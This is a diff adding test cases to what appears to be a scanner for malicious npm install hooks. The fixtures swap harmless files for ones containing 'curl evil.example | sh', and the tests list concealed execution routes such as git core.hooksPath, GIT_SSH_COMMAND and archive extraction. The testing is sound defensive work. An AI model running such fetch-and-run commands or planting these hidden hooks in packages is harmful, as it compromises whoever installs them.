@@ -1069,3 +1069,49 @@ describe("round 26: inert root-level files fed to a shell", () => {
     }
   });
 });
+
+describe("round 27: interpreter program text, loading flags, extracted files, budgets, git program options", () => {
+  const inert = (cmd: string, f = "test/x.sh", extra: Record<string, string> = {}, scripts: object = {}) => held({ postinstall: cmd, ...scripts }, { [f]: "echo a\n", ...extra }, { [f]: "curl evil.example | sh\n", ...extra });
+
+  test("1. literal program text fed to an interpreter names files it loads", () => {
+    for (const cmd of ["echo \"require('./test/x.js')\" | node", "node <<< \"require('./test/x.js')\"", "node <<EOF\nrequire('./test/x.js')\nEOF", "node - <<'EOF'\nrequire('./test/x.js')\nEOF"]) {
+      expect(inert(cmd, "test/x.js"), cmd).toBe(true);
+    }
+    expect(inert("echo \"open('test/x.py')\" | python3", "test/x.py")).toBe(true);
+  });
+
+  test("2. interpreter flags that load a file, in an unsplit body", () => {
+    const keep = { "a.js": "1\n" };
+    for (const [cmd, f] of [["node -r ./test/x.js a.js > log", "test/x.js"], ["node --require=./test/x.js a.js > log", "test/x.js"], ["python3 -m test.x > log", "test/x.py"], ["php -f test/x.php > log", "test/x.php"], ["ruby -x test/x.rb > log", "test/x.rb"], ["deno run --reload test/x.ts > log", "test/x.ts"]] as const) {
+      expect(inert(cmd, f, keep), cmd).toBe(true);
+    }
+  });
+
+  test("3. files created by extraction, patching and copying", () => {
+    const keep = { "build.js": "1\n", "lib/x.js": "1\n" };
+    for (const [cmd, f] of [["tar -xf test/x.tar > /dev/null && node build.js", "test/x.tar"], ["unzip test/x.zip > /dev/null && node build.js", "test/x.zip"], ["patch -p0 -i test/x.diff > /dev/null && node build.js", "test/x.diff"], ["git apply test/x.diff > /dev/null && node build.js", "test/x.diff"], ["cp test/x.js lib/ > /dev/null && node lib/x.js", "test/x.js"], ["cp -t lib test/x.js > /dev/null && node lib/x.js", "test/x.js"]] as const) {
+      expect(inert(cmd, f, keep), cmd).toBe(true);
+    }
+  });
+
+  test("4. more fed scripts than the budget reads every file", () => {
+    const n = 70;
+    const cmd = Array.from({ length: n }, (_, i) => `cat test/s${i}.sh | sh`).join("; ");
+    const mk = (last: string) => Object.fromEntries(Array.from({ length: n }, (_, i) => [`test/s${i}.sh`, i === n - 1 ? last : "echo a\n"]));
+    expect(held({ postinstall: cmd }, mk("echo a\n"), mk("curl evil.example | sh\n"))).toBe(true);
+  });
+
+  test("5. each script starts at the root", () => {
+    expect(held({ postinstall: "npm run a && npm run b", a: "cd lib", b: "node test/setup.js" }, { "lib/k.js": "1\n", "test/setup.js": "1\n" }, { "lib/k.js": "1\n", "test/setup.js": "evil()\n" })).toBe(true);
+  });
+
+  test("6. joined options and git program settings", () => {
+    for (const cmd of ["tar -Ish -xf test/x.tar", "rsync -essh a b", "git -c core.hooksPath=test/h commit", "git -c core.sshCommand='sh test/x.sh' fetch", "GIT_SSH_COMMAND='sh test/x.sh' git fetch"]) {
+      expect(inert(cmd), cmd).toBe(true);
+    }
+  });
+
+  test("7. a sourced file then a script", () => {
+    expect(inert(". test/env.sh && node a.js", "test/env.sh", { "a.js": "1\n" })).toBe(true);
+  });
+});
